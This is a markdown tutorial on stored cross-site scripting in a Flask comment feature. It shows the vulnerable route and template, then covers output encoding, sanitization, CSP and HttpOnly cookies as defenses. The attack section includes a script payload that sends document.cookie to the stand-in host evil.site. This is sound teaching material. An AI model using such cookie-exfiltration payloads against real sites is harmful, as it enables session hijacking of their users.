
# Flask XSS Example

## Vulnerable Flask Route

```python
@app.route("/comment", methods=["POST"])
def submit_comment():
        comment = request.form["comment"]
        db.execute("INSERT INTO comments (body) VALUES (?)", (comment,))
```

---

> **Attacker submits a comment like:**

```html
<script>
fetch("https://evil.site/steal?c=" + document.cookie)
</script>
```

---

> **The database now contains:**

```text
body = "<script>fetch('https://evil.site/steal?c=' + document.cookie)</script>"
```

---

> **Later, when the comment is displayed, the script runs in other users' browsers:**

```jinja
{% for comment in comments %}
    <div class="comment">
        {{ comment.body }}
    </div>
{% endfor %}
```

---

> **When a victim loads the page, the browser sees:**

```html
<div class="comment">
    <script>
        fetch("https://evil.site/steal?c=" + document.cookie)
    </script>
</div>
```

---

> **JavaScript executes in the victim’s session.**

db.insert(comment)
## Protections

> **Primary defense:**
> 
> **Context-aware output encoding** (non-negotiable)

Encoding **at output** ensures user data is treated as text, never as HTML, JS, CSS, or URL syntax.

- The payload can exist.
- It can be stored.
- It just cannot execute.

---

### Example: Stored Comment (Correct Defense)

**Backend (unchanged):**

```python
db.insert(comment)
```

**Frontend (fixed):**

```jinja
<div class="comment">
    {{ comment.body | html_escape }}
</div>
```

**Stored value:**

```html
<script>alert(1)</script>
```

**Rendered output:**

```html
&lt;script&gt;alert(1)&lt;/script&gt;
```

> 📌 Browser sees text → not code → no XSS.

---

### Context Matters

| Context           | Required Encoding         |
|-------------------|--------------------------|
| HTML body         | HTML entity encoding      |
| HTML attribute    | Attribute encoding        |
| JavaScript string | JS string / Unicode       |
| URL               | Percent encoding          |
| CSS               | CSS hex encoding          |

> Using the wrong encoder = still vulnerable.

## HTML sanitization (only when you allow rich content)

Encoding is best — but sometimes you want limited HTML (comments, markdown, WYSIWYG editors).

In that case:

✔ Allow <b>, <i>, <p>
✘ Remove <script>, onerror, javascript:

Example (server-side sanitization)
sanitizeHtml(userInput, {
  allowedTags: ['b', 'i', 'p'],
  allowedAttributes: {}
})


### Sanitization is harder than encoding and should be:

> - **Library-based**
> - **Defense-in-depth**
> - **Never regex-based**

---

## Content Security Policy (CSP) — Blast-Radius Reduction

> CSP does not prevent storage of XSS.
> It limits what an injected payload can do.

**Example CSP:**

```http
Content-Security-Policy:
    default-src 'self';
    script-src 'self';
    object-src 'none';
```

**Effect:**

Even if this executes:

```html
<script src="https://evil.site/x.js"></script>
```

🚫 **Browser blocks it.**

> CSP turns critical XSS into low-impact XSS when properly configured.

---

## HttpOnly Cookies (Stops the Most Common Payload Goal)

> Most stored XSS aims to steal cookies (the victim's session)

**Set-Cookie Example:**

```http
Set-Cookie: session=abc123; HttpOnly; Secure
```

**How HttpOnly protects against XSS:**

When a cookie is marked HttpOnly:

```http
Set-Cookie: session=abc123; HttpOnly; Secure
```

The browser enforces this rule:

> JavaScript is **not allowed** to read this cookie.

So if an attacker injects XSS and runs:

```javascript
document.cookie
```

The browser returns:

```text
""   // empty or missing the session cookie
```

> The XSS might still execute — but session hijacking fails.
